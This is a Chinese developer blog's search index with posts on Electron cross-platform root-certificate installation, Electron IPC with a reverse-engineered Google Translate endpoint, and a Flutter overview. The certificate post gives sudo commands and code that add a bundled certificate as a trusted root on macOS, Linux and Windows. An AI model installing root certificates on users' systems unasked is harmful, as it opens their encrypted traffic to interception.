<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Electron-cer 跨平台证书安装</title>
    <url>/posts/554d6708/</url>
    <content><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>这是一份关于证书安装的教程，采用<strong>electron</strong>去实现跨平台证书安装。</p>
<h3 id="shell-命令"><a href="#shell-命令" class="headerlink" title="shell 命令"></a>shell 命令</h3><a id="more"></a>

<h4 id="mac"><a href="#mac" class="headerlink" title="mac"></a>mac</h4><p>列出证书</p>
<blockquote>
<p>sudo security dump-keychain /Library/Keychains/System.keychain</p>
</blockquote>
<p>安装证书</p>
<blockquote>
<p>sudo security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain ~/cer.crt</p>
</blockquote>
<p>删除证书</p>
<blockquote>
<p>sudo security delete-certificate -c “OK Group Certificate Authority”</p>
</blockquote>
<h4 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h4><p>列出证书</p>
<blockquote>
<p>ls /usr/local/share/ca-certificates/</p>
</blockquote>
<p>安装证书</p>
<blockquote>
<p>拷贝证书到【目录：/usr/local/share/ca-certificates/】<br>命令： sudo cp cer.crt /usr/local/share/ca-certificates/foo.crt<br>更新 CA 证书数据库存储：sudo update-ca-certificates</p>
</blockquote>
<p>删除证书</p>
<blockquote>
<p>把证书从【目录：/usr/local/share/ca-certificates/】中删除<br>命令： sudo rm /usr/local/share/ca-certificates/cer.crt<br>更新 CA 证书数据库存储：sudo update-ca-certificates –fresh</p>
</blockquote>
<h4 id="linux-centos-6"><a href="#linux-centos-6" class="headerlink" title="linux (centos 6)"></a>linux (centos 6)</h4><p>列出证书</p>
<blockquote>
<p>ls /etc/pki/ca-trust/source/anchors/</p>
</blockquote>
<p>安装证书</p>
<blockquote>
<p>安装 ca-certificates 包： yum install ca-certificates<br>启用动态 CA 配置功能： update-ca-trust force-enable<br>将其作为新文件添加到【目录：/etc/pki/ca-trust/source/anchors/】 中<br>命令：cp OK_Group_OA.crt /etc/pki/ca-trust/source/anchors/<br>更新证书存储：update-ca-trust extract</p>
</blockquote>
<p>删除证书</p>
<blockquote>
<p>把证书从【目录：/etc/pki/ca-trust/source/anchors/】中删除<br>命令： sudo rm /etc/pki/ca-trust/source/anchors/cer.crt<br>更新 CA 证书数据库存储：sudo update-ca-trust extract</p>
</blockquote>
<h4 id="linux-centos-5"><a href="#linux-centos-5" class="headerlink" title="linux (centos 5)"></a>linux (centos 5)</h4><p>列出证书</p>
<blockquote>
<p>列出证书功能 需要去 <strong>ca-bundle.crt</strong> 文件中查看。</p>
</blockquote>
<p>安装证书</p>
<blockquote>
<p>把可信证书附加到【文件：/etc/pki/tls/certs/ca-bundle.crt】 中，也就是追加到文本末尾<br>命令：cat OK_Group_OA.crt &gt;&gt;/etc/pki/tls/certs/ca-bundle.crt</p>
</blockquote>
<p>删除证书</p>
<blockquote>
<p>把 OK_Group_OA.crt 的内容删除掉，即可。<br>vim /etc/pki/tls/certs/ca-bundle.crt<br>删除完， :wq 保存</p>
</blockquote>
<h4 id="windows-10-windows-7"><a href="#windows-10-windows-7" class="headerlink" title="windows-10 || windows-7"></a>windows-10 || windows-7</h4><p>列出证书</p>
<blockquote>
<p>cmd 运行 certmgr.msc</p>
</blockquote>
<p>安装证书</p>
<blockquote>
<p>certutil -addstore -f “ROOT” cer.crt</p>
</blockquote>
<p>删除证书</p>
<blockquote>
<p>certutil -delstore “ROOT” serial-number-hex</p>
</blockquote>
<h3 id="安装证书核心代码"><a href="#安装证书核心代码" class="headerlink" title="安装证书核心代码"></a>安装证书核心代码</h3><p>证书类，提供了安装证书的功能，内部去判断所在的操作系统。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; app &#125; = <span class="built_in">require</span>(<span class="string">&quot;electron&quot;</span>);</span><br><span class="line"><span class="keyword">import</span> sudo <span class="keyword">from</span> <span class="string">&quot;sudo-prompt&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; throwError &#125; <span class="keyword">from</span> <span class="string">&quot;rxjs&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> os = <span class="built_in">require</span>(<span class="string">&quot;os&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&quot;path&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs-extra&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">InstallCer</span> </span>&#123;</span><br><span class="line">  platform = os.type().toLowerCase();</span><br><span class="line">  cerPath = path.resolve(__dirname, <span class="string">&quot;../assets/cers&quot;</span>, <span class="string">&quot;cer.crt&quot;</span>);</span><br><span class="line">  configDir = app.getPath(<span class="string">&quot;userData&quot;</span>);</span><br><span class="line">  assetsDir = path.resolve(<span class="built_in">this</span>.configDir, <span class="string">&quot;assets/&quot;</span>);</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;证书路径：&quot;</span>, <span class="built_in">this</span>.cerPath);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;实例化成功,当前系统：&quot;</span>, <span class="built_in">this</span>.platform);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;用户目录：&quot;</span>, <span class="built_in">this</span>.configDir);</span><br><span class="line">    <span class="built_in">this</span>.init();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">init</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    fs.ensureDirSync(<span class="built_in">this</span>.assetsDir);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      fs.copySync(<span class="built_in">this</span>.cerPath, <span class="string">`<span class="subst">$&#123;<span class="built_in">this</span>.assetsDir&#125;</span>/cer.crt`</span>);</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">&quot;拷贝证书成功&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">      <span class="keyword">throw</span> err;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// mac 系统安装证书</span></span><br><span class="line">  <span class="function"><span class="title">darwin</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain &quot;<span class="subst">$&#123;<span class="built_in">this</span>.assetsDir&#125;</span>/cer.crt&quot;`</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// windows 系统安装证书</span></span><br><span class="line">  <span class="function"><span class="title">windows_nt</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`certutil -addstore -f &quot;ROOT&quot; &quot;<span class="subst">$&#123;<span class="built_in">this</span>.assetsDir&#125;</span>/cer.crt&quot;`</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">runCer</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> command = <span class="built_in">this</span>[<span class="built_in">this</span>.platform]();</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span> (<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">      sudo.exec(</span><br><span class="line">        command,</span><br><span class="line">        &#123;</span><br><span class="line">          name: <span class="string">&quot;OK Network Assistant&quot;</span>,</span><br><span class="line">          icns: path.resolve(__dirname, <span class="string">&quot;../assets/&quot;</span>, <span class="string">&quot;icon.icns&quot;</span>),</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="function"><span class="keyword">function</span> (<span class="params">error</span>) </span>&#123;</span><br><span class="line">          <span class="keyword">if</span> (error) &#123;</span><br><span class="line">            reject(error);</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            resolve(<span class="literal">true</span>);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      );</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="坑无敌"><a href="#坑无敌" class="headerlink" title="坑无敌"></a>坑无敌</h3><h4 id="shell-读取-assar-资源"><a href="#shell-读取-assar-资源" class="headerlink" title="shell 读取 assar 资源"></a>shell 读取 assar 资源</h4><p>问题：</p>
<p>在进行安装时，出现了读取资源失败的问题。通过查阅官方文案，发现时 assar 中的资源不支持通过<strong>shell 管道</strong>的形式获取资源。</p>
<p>解决：</p>
<p>在进行安装时，先吧=把资源从<strong>assar</strong>中拷贝到 assar 外的目录下。这里我吧目录放在了用户目录下，通过 <strong>app.getPath(‘userData’)</strong> 该方法去获取每个操作系统的用户目录。</p>
<h4 id="开发与运行环境对文件的依赖"><a href="#开发与运行环境对文件的依赖" class="headerlink" title="开发与运行环境对文件的依赖"></a>开发与运行环境对文件的依赖</h4><p>问题：</p>
<p>由于路径在开发与运行时都是相对的一个路径，所以在打包后，运行时无法找到 icon\证书等文件。</p>
<p>解决：</p>
<p>在开发时提供一份资源目录，生成环境打包的地方再次提供一份目录，目前虽然解决。但是还是需要升级下解决方案！</p>
<h4 id="安装证书成功、失败、强制安装新证书"><a href="#安装证书成功、失败、强制安装新证书" class="headerlink" title="安装证书成功、失败、强制安装新证书"></a>安装证书成功、失败、强制安装新证书</h4><p>问题：<br>在安装了证书的用户电脑上，如果重新安装时，是无法进行安装的。</p>
<p>解决：<br>使用<strong>electron-store</strong>数据配置模块，去记录该电脑的操作。如果用户安装了就保存 value:1，失败为 2。但是如果再次发布新的版本时，安装成功的 value 值就需要重新改变。该值计次叠加！</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">componentDidMount</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ([<span class="literal">undefined</span>, <span class="number">2</span>, <span class="number">1</span>].includes(store.get(<span class="string">&#x27;isInstallCer&#x27;</span>))) &#123;</span><br><span class="line">      <span class="built_in">this</span>.time = <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.handleSearch();</span><br><span class="line">        <span class="built_in">clearTimeout</span>(<span class="built_in">this</span>.time);</span><br><span class="line">      &#125;, <span class="number">1000</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="built_in">this</span>.props.history.push(routes.COUNTER)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>在这，我把每次安装成功使用过的值都放入**[undefined, 2, 1]**这里。使得每次发布的新版本。用户在使用时可以安装到心得证书！</p>
]]></content>
      <tags>
        <tag>react</tag>
        <tag>electron</tag>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title>Electron 应用 （爱翻译）</title>
    <url>/posts/e39f5ecb/</url>
    <content><![CDATA[

<h3 id="什么是-Electron"><a href="#什么是-Electron" class="headerlink" title="什么是 Electron"></a>什么是 Electron</h3><p><a href="https://link.juejin.im/?target=https://electron.atom.io">Electron</a> 是前端开发者去构建跨平台桌面应用的一种方案。大家熟悉的 Atom 和 VSCode 编辑器就是使用 Electron 开发的。</p>
<p><a href="https://link.juejin.im/?target=https://electron.atom.io">Electron</a> 是 Node.js 和 Chromium 浏览器的结合体，用 Chromium 浏览器显示出的 Web 页面作为应用的 GUI，通过 Node.js 去和操作系统交互。 当你在 Electron 应用中的一个窗口操作时，实际上是在操作一个网页。当你的操作需要通过操作系统去完成时，网页会通过 Node.js 去和操作系统交互。</p>
<a id="more"></a>

<p><a href="https://link.juejin.im/?target=https://electron.atom.io">Electron</a> 开发桌面端应用的优点有：</p>
<ul>
<li>降低开发门槛，减少了学习的成本，只需掌握前端技术和 Node.js 即可，不需要为开发一个桌面应用去学习其它的编程语言。</li>
<li>由于 Chromium 浏览器和 Node.js 都是跨平台的，Electron 能做到写一份代码在不同的操作系统运行。</li>
<li>而且可以使用 vue\react 等框架去开发 GUI，总之强大的生态系统还需要灵活的统筹能力，去组合。</li>
</ul>
<h3 id="Electron-的进程问题？"><a href="#Electron-的进程问题？" class="headerlink" title="Electron 的进程问题？"></a>Electron 的进程问题？</h3><h4 id="1、-主进程-Main-Process"><a href="#1、-主进程-Main-Process" class="headerlink" title="1、 主进程 Main Process"></a>1、 主进程 Main Process</h4><p>主进程，其实就是 electron 执行时，首次加载的可执行代码资源。我要渲染每个 GUI 页面，就需要有主进程去把控资源的分配、释放。那么在 Electron 中怎么确认我写的那个文件是主进程文件呢。<br>主进程加载的文件就是：packages.json 文件中的 main 字段指向的文件。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">这是一份最基础的主进程代码;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> &#123; app, BrowserWindow &#125; = <span class="built_in">require</span>(<span class="string">&quot;electron&quot;</span>);</span><br><span class="line"><span class="keyword">let</span> win;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createWindow</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  win = <span class="keyword">new</span> BrowserWindow(&#123; <span class="attr">width</span>: <span class="number">800</span>, <span class="attr">height</span>: <span class="number">600</span> &#125;);</span><br><span class="line">  <span class="keyword">const</span> indexPageURL = <span class="string">`file://<span class="subst">$&#123;__dirname&#125;</span>/dist/index.html`</span>;</span><br><span class="line">  win.loadURL(indexPageURL);</span><br><span class="line">  win.on(<span class="string">&quot;closed&quot;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    win = <span class="literal">null</span>;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line">app.on(<span class="string">&quot;ready&quot;</span>, createWindow);</span><br><span class="line">app.on(<span class="string">&quot;window-all-closed&quot;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (process.platform !== <span class="string">&quot;darwin&quot;</span>) &#123;</span><br><span class="line">    app.quit();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h4 id="2、渲染进程-Render-Process"><a href="#2、渲染进程-Render-Process" class="headerlink" title="2、渲染进程 Render Process"></a>2、渲染进程 Render Process</h4><p>渲染进程，就是用来进行进行页面的渲染，在主进城创建好友，会调用渲染进程去渲染页面资源。渲染进程指向的资源也就是你构建好、要呈现视图的 HTML 前端代码资源文件。比如你使用 webpack 构建出来的 dist 文件夹里面的数据就是。<br>渲染进程也可以看作是浏览器的每一个页面，一个页面对应一个进程，是不相同的。渲染进程的创建需要由主进程 BrowserWindow 对象去创建。</p>
<h4 id="3、主进程与渲染进程的关系"><a href="#3、主进程与渲染进程的关系" class="headerlink" title="3、主进程与渲染进程的关系"></a>3、主进程与渲染进程的关系</h4><ul>
<li>主进程在创建好后，会在创建一个子进程去加载资源，资源可以是网路资源(网站地址)，也可以是本地资源(html 文件)。</li>
<li>主进程在创建窗口对象后，才会通过子进程去加载资源，那么窗口创建是有相应的生命周期事件去触发的。详情见# <a href="https://electronjs.org/docs/api/browser-window#browserwindow">BrowserWindow</a></li>
</ul>
<h4 id="4、进程通信-主进程-渲染进程"><a href="#4、进程通信-主进程-渲染进程" class="headerlink" title="4、进程通信 [主进程-渲染进程]"></a>4、进程通信 [主进程-渲染进程]</h4><p>我们在开发网页应用的时候，需要实现跨页面通信。可以使用<strong>localStorage</strong> 和 <strong>H5 postMessages</strong>。那么到了 electron 中同样适用，但是还有其它的方法去实现通信。就是进程通信！</p>
<ul>
<li>一种是使用<a href="https://github.com/electron/electron/blob/v1.1.3/docs/api/ipc-main.md">ipcMain</a>和<a href="https://github.com/electron/electron/blob/v1.1.3/docs/api/ipc-renderer.md">ipcRenderer</a>模块，在渲染进程中使用 ipcRender 模块向主进程发送消息，主进程中 ipcMain 接收消息，进行操作，如果还需要反馈，则通知渲染进程，渲染进程根据接收的内容执行相应的操作：</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">主进程;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> &#123; app, BrowserWindow, ipcMain &#125; = <span class="built_in">require</span>(<span class="string">&quot;electron&quot;</span>);</span><br><span class="line"></span><br><span class="line">ipcMain.on(<span class="string">&quot;fy&quot;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">event, value</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; net &#125; = <span class="built_in">require</span>(<span class="string">&quot;electron&quot;</span>);</span><br><span class="line">  <span class="keyword">const</span> request = net.request(</span><br><span class="line">    <span class="string">&quot;http://translate.google.cn/translate_a/single?client=gtx&amp;dt=t&amp;ie=UTF-8&amp;oe=UTF-8&amp;sl=auto&amp;tl=en&amp;q=&quot;</span> +</span><br><span class="line">      value</span><br><span class="line">  );</span><br><span class="line">  request.on(<span class="string">&quot;response&quot;</span>, <span class="function">(<span class="params">response</span>) =&gt;</span> &#123;</span><br><span class="line">    response.setEncoding(<span class="string">&quot;utf8&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> connect = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    response.on(<span class="string">&quot;data&quot;</span>, <span class="function">(<span class="params">chunk</span>) =&gt;</span> &#123;</span><br><span class="line">      connect = chunk;</span><br><span class="line">    &#125;);</span><br><span class="line">    response.on(<span class="string">&quot;end&quot;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">      mainWindow.webContents.send(<span class="string">&quot;fymessage&quot;</span>, connect);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">  request.end();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">渲染进程;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> &#123; remote, dialog, ipcRenderer &#125; <span class="keyword">from</span> <span class="string">&quot;electron&quot;</span>;</span><br><span class="line"></span><br><span class="line">handleSearch = <span class="function">(<span class="params">value</span>) =&gt;</span> &#123;</span><br><span class="line">  ipcRenderer.send(<span class="string">&quot;fy&quot;</span>, value);</span><br><span class="line">  <span class="keyword">const</span> that = <span class="built_in">this</span>;</span><br><span class="line">  ipcRenderer.on(<span class="string">&quot;fymessage&quot;</span>, <span class="function">(<span class="params">event, text</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(text);</span><br><span class="line">    that.setState(&#123;</span><br><span class="line">      languageText: text.split(<span class="string">&#x27;&quot;,&#x27;</span>)[<span class="number">0</span>].replace(<span class="regexp">/\[\[\[\&quot;/g</span>, <span class="string">&quot;&quot;</span>),</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<ul>
<li>第二种是直接在渲染进程使用<a href="http://electron.atom.io/docs/api/remote/">remote</a>模块，remote 模块可以直接获取主进程中的模块。这种方式其实是第一种方式的简化。</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">通过remote对象调用主进程进行dialog操作。</span><br><span class="line"></span><br><span class="line"> remote.dialog.showErrorBox(<span class="string">&quot;翻译失败&quot;</span>, <span class="string">&quot;翻译内容不能为空，请重新执行&quot;</span>);</span><br></pre></td></tr></table></figure>



<ul>
<li>第三种是主进程向渲染进程发送消息</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">mainWindow：是通过 <span class="keyword">new</span>  BrowserWindow(&#123;&#125;) 创建出来的窗口对象。</span><br><span class="line">mainWindow.webContents.send(<span class="string">&#x27;发送标识-类型判断&#x27;</span>, <span class="string">&#x27;发送内容&#x27;</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>第四种是渲染进程之间的通信</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 主进程</span></span><br><span class="line"><span class="comment">// 两个窗口互相获取对方的窗口 id, 并发送给渲染进程</span></span><br><span class="line">win1.webContents.send(<span class="string">&quot;distributeIds&quot;</span>, &#123;</span><br><span class="line">  win2Id: win2.id,</span><br><span class="line">&#125;);</span><br><span class="line">win2.webContents.send(<span class="string">&quot;distributeIds&quot;</span>, &#123;</span><br><span class="line">  win1Id: win1.id,</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 渲染进程</span></span><br><span class="line"><span class="comment">// 通过 id 得到窗口</span></span><br><span class="line">remote.BrowserWindow.fromId(win2Id).webContents.send(<span class="string">&quot;someMsg&quot;</span>, <span class="string">&quot;someThing&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>总体来说，electron 开发不是很难，而是对浏览器的重新认识。<br>在上述的列子中，讲解了如何进程通信，也表述了 electron 的 net 模块，进行 http 通信。在这里我使用了谷歌的翻译接口，这个接口也是逆向分析出来的。怎么分析就不叙述了。这里只概述 electron 的知识体系。</p>
<p>剩下就是 node 的各个模块操作了。在 electron 中调用 node 的模块。如 http,fs,等。</p>
]]></content>
      <tags>
        <tag>electron</tag>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title>flutter</title>
    <url>/posts/2a2a7e8a/</url>
    <content><![CDATA[<h2 id="Flutter"><a href="#Flutter" class="headerlink" title="Flutter"></a>Flutter</h2><blockquote>
<p><a href="https://flutter.io/">Flutter</a> 是谷歌的移动 UI 框架，可以快速在 iOS 和 Android 上构建高质量的原生用户界面。 Flutter 可以与现有的代码一起工作。在全世界，Flutter 正在被越来越多的开发者和组织使用，并且 <a href="https://flutter.io/">Flutter</a> 是完全免费、开源的。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">中文官网:</span><br><span class="line">https:&#x2F;&#x2F;flutterchina.club&#x2F;setup-macos&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;flutter-io.cn&#x2F;</span><br><span class="line"></span><br><span class="line">第三方库   可以理解为npm</span><br><span class="line">https:&#x2F;&#x2F;pub.dartlang.org&#x2F;flutter</span><br><span class="line"></span><br><span class="line">环境搭建\入门\填坑指南</span><br><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;hekaiyou&#x2F;article&#x2F;details&#x2F;52874796</span><br><span class="line">https:&#x2F;&#x2F;www.jianshu.com&#x2F;p&#x2F;399c01657920</span><br><span class="line"></span><br><span class="line">国内Flutter论坛</span><br><span class="line">http:&#x2F;&#x2F;flutter-dev.cn&#x2F;</span><br><span class="line"></span><br><span class="line">Dart\Flutter 扩展插件</span><br><span class="line">https:&#x2F;&#x2F;dartcode.org&#x2F;releases&#x2F;v2-19&#x2F;</span><br><span class="line"></span><br><span class="line">Flutter入门实例</span><br><span class="line">https:&#x2F;&#x2F;juejin.im&#x2F;post&#x2F;5b31d776e51d455e2b5ab253</span><br><span class="line"></span><br><span class="line">Widget组件介绍</span><br><span class="line">https:&#x2F;&#x2F;juejin.im&#x2F;post&#x2F;5bab35ff5188255c3272c228</span><br><span class="line"></span><br><span class="line">GitHub-Flutter聚集地</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;xitu&#x2F;awesome-flutter</span><br></pre></td></tr></table></figure>

<a id="more"></a>

<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>** 概念 **</p>
<ol>
<li><p>Flutter 是一个移动应用程序的软件开发工具包（SDK），具有以下特征：</p>
<blockquote>
<p>跨平台应用的框架，没有使用 WebView 或者系统平台自带的控件，使用自身的高性能渲染引擎自绘<br>简化版的浏览器，最大限度在 android 和 ios 上统一 UI，包括业务逻辑和用户体验<br>开发语言使用 dart，结合 C, C++, 和 Skia（2D 渲染引擎）构建<br>支持 hot reload，包含着完整的控件和工具链</p>
</blockquote>
<blockquote>
<p>一切皆控件，控件是每个 Flutter 应用程序的基本构建块，与分离视图、控制器、布局和其他属性的框架不同，Flutter 具有一致的统一对象模型：控件。一个控件可以定义：结构元素（比如按钮或菜单）、风格元素（比如字体或颜色方案）、布局的方面（比如填充）、一些业务逻辑等</p>
</blockquote>
<blockquote>
<p>与 React 理念相同，都是组合大于继承，控件本身通常由许多小型、单用途的控件组成，结合起来产生强大的效果，类的层次结构是扁平的，以最大化可能的组合数量</p>
</blockquote>
<blockquote>
<p>强化版的 WebView，框架仅提供一个 View 层，大部分功能要依赖原生<br>目前只能够运行大部分 Dart 代码（不能引入 dart:mirrors 或 dart:html 库）</p>
</blockquote>
</li>
</ol>
<p>** 优势 **</p>
<ol>
<li><p>宏观上：</p>
<blockquote>
<p>Flutter 能够提供优美的 UI 和流畅的使用体验<br>Flutter 降低了开发 App 的门槛，加速移动应用的开发速度，并且能够降低同时开发 Android 和 iOS 应用的成本和复杂度<br>Flutter 能够轻松做出原型并且能够保持相当高还原度</p>
</blockquote>
</li>
<li><p>微观上：</p>
<blockquote>
<p>高效率，用一套代码库就能开发 iOS 和 Android 应用<br>使用新型的、表现力强的语言和声明式的方法，用更少的代码来做更多的事情<br>可以在应用程序运行时更改代码并重新加载查看效果，也就是热重新加载<br>修复崩溃时可以从应用程序停止的位置继续调试<br>创建美观、高度定制的用户体验<br>Flutter 框架内置了一组丰富的质感设计控件<br>实现定制、美观、品牌驱动的设计，而不受 OEM 控件集的限制<br>深度优化，移动优先的 2D 渲染引擎而且对文本支持非常出色<br>react 风格的框架<br>支持单元和集成测试的 API<br>支持与系统平台和第三方 SDK 交互的插件 API<br>支持 Windows，Mac 和 Linux 的 Headless test runner</p>
</blockquote>
</li>
</ol>
<h3 id="运行机制"><a href="#运行机制" class="headerlink" title="运行机制"></a>运行机制</h3><p>Flutter 应用运行在一个用 C++ 写的引擎中，Flutter 应用可以看做是一个游戏 App，代码都是在引擎中运行。</p>
<p>** Android **</p>
<p>引擎的 C 或 C++代码是由 Android NDK 编译的，而框架的主要代码和应用的代码由 Dart compiler 编译成 native code 执行的。</p>
<p>对于 Android 应用来说，Flutter 框架在引擎中实现了一个继承于 SurfaceView 的 FlutterView。用户所看到的 UI 都是在这个 SurfaceView 中显示。如果要和原生平台功能交互，则可以在 Activity 中使用 FlutterView，并通过 Flutter 提供的消息 API 和原生平台收发消息。</p>
<p>** ios **</p>
<p>引擎的 C 或 C++代码是由 LLVM 编译的，而所有 Dart 的代码会被 AOT 编译成 native code，整个 APP 运行时使用的是机器指令（并不是拦截器）。</p>
<h3 id="架构"><a href="#架构" class="headerlink" title="架构"></a>架构</h3><p>** 层次描述 **</p>
<img src="/posts/2a2a7e8a/FlutterFramework.png" class="" title="Flutter架构">

<p>Flutter 的框架分为 Framework 和 Engine 两层，应用是基于 Framework 层开发的，Framework 负责渲染中的 Build，Layout，Paint，生成 Layer 等环节。Engine 层是 C++实现的渲染引擎，负责把 Framework 生成的 Layer 组合，生成纹理，然后通过 Open GL 接口向 GPU 提交渲染数据。</p>
<p>** 图形管道 **</p>
<img src="/posts/2a2a7e8a/FlutterFramework1.png" class="" title="Flutter运行">

<p>** 渲染管道 **</p>
<img src="/posts/2a2a7e8a/flutterRun.png" class="" title="Flutter运行">

<p>当需要更新 UI 的时候，Framework 通知 Engine，Engine 会等到下个 Vsync 信号到达的时候，会通知 Framework，然后 Framework 会进行 animations, build，layout，compositing，paint，最后生成 layer 提交给 Engine。Engine 会把 layer 进行组合，生成纹理，最后通过 Open Gl 接口提交数据给 GPU， GPU 经过处理后在显示器上面显示。</p>
<p>当应用调用 setState 后，经过 Framework 一连串的调用后，最终调用 scheduleFrame 来通知 Engine 需要更新 UI，Engine 就会在下个 vSync 到达的时候通过调用_drawFrame 来通知 Framework，然后 Framework 就会通过 BuildOwner 进行 Build 和 PipelineOwner 进行 Layout，Paint，最后把生成 Layer，组合成 Scene 提交给 Engine。接下来我们从代码中分析一下，这些环节具体是怎么样实现的。首先从 Engine 回调 Framework 的入口开始。</p>
<p>在 Flutter 应用开发中,无状态的 widget 是通过 StatelessWidget 的 build 方法构建 UI，有状态的 widget 是通过 State 的 build 方法构建 UI。现在具体分析一下从 setState 调用后到调用自定义 State 的 build 的流程是怎样的（现在只分析有状态的 widget 渲染过程）。</p>
<p>在 Flutter 中应用中，是使用支持 layout 的 widget 来实现布局的，支持 layout 的 wiget 有 Container，Padding，Align 等等，强大又简易。在渲染流程中，在 widget build 后会进入 layout 环节，下面具体分析一下 layout 的实现，layout 入口是 flushLayout。</p>
<h3 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h3><p>Flutter 支持 ios android Tv 嵌入式系列开发</p>
<h3 id="了解-Widget-组件"><a href="#了解-Widget-组件" class="headerlink" title="了解** Widget **组件"></a>了解** Widget **组件</h3><p>在 Flutter 中，我们平时自定义的 widget，一般都是继承自 StatefulWidget 或 StatelessWidget（并不是只有这两种），这两种 widget 也是目前最常用的两种。如果一个控件自身状态不会去改变，创建了就直接显示，不会有色值、大小或者其他属性的变化，这种 widget 一般都是继承自 StatelessWidget，常见的有 Container、ScrollView 等。如果一个控件需要动态的去改变或者相应一些状态，例如点击态、色值、内容区域等，那么一般都是继承自 StatefulWidget，常见的有 CheckBox、AppBar、TabBar 等。其实单纯的从名字也可以看出这两种 widget 的区别，这两种 widget 都是继承自 Widget 类。</p>
<p>Widget 类在 Flutter 中是非常重要的，继承自 Widget 类的有 PreferredSizeWidget、ProxyWidget、RenderObjectWidget、StatefulWidget、StatelessWidget。我们日常使用的绝大部分 widget 都是继承自 Widget 类，</p>
<h3 id="生命周期"><a href="#生命周期" class="headerlink" title="生命周期"></a>生命周期</h3><p>** 控件生命周期 **</p>
<img src="/posts/2a2a7e8a/flutterWidgetBuild.png" class="" title="Flutter运行">

